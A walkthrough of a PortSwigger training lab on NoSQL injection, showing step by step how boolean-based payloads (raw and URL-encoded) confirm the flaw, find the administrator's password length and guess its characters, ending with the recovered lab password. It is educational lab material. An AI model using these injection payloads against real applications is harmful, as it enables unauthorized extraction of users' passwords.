## Welcome My friends , Today we will attack this [Lab: Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data#)

We have credentials: ```wiener:peter``` 


Watch this following vedio:

We know that there acount of username is ```administrator```  Let's go hack his password.

Let's test this prameter if it is vulnerable NoSQLI or not.
We use this payload:

```
wiener' && '1'=='1
```

If we use that payload we will have a error

This error because we exploit parameter in url and should encode this payload such as following:

We can select this payload in repeater and ```CTL + U```

```
wiener'+%26%26+'1'%3d%3d'1
```

because ```1==1``` is true so data is showd.

Now Let's change this condition ```1==2``` is false


```
wiener' && '1'=='2
```

after encoding url:

```
wiener'+%26%26+'1'%3d%3d'2
```

Ok great It is here vulnerable ...

# 1 In first should known length of ```administrator's``` account:


```
administrator' && this.password.length == 10 || 'a'=='b
```

after encoding url:

```
administrator'+%26%26+this.password.length+%3d%3d+10+||+'a'%3d%3d'b
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/8a9adfcc-be89-4012-846f-4cf3f914c3eb)


umm this password does'nt contain ```10``` letters, ok we will try ```8``` letters



```
administrator'+%26%26+this.password.length+%3d%3d+8+||+'a'%3d%3d'b
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/367a917e-abfa-4374-8fff-21fae705058d)


Great, Now we know that password is 8 letters but we don't know these letters.

# 2 In second should known letters of ```administrator's``` account:

Here we try guess first letters by ```a```

```
administrator' && this.password[0]=='a
```

after encodig url:

```
administrator'+%26%26+this.password[0]%3d%3d'a
```

umm this password does'nt contain first letter ```a``` , ok we will try ```w``` 

```
administrator'+%26%26+this.password[0]%3d%3d'w
```

ok it is boring so we will using ```intruder```:

## Great we have password of administrator's account is ```wwhflfug``` ðŸ¥³.
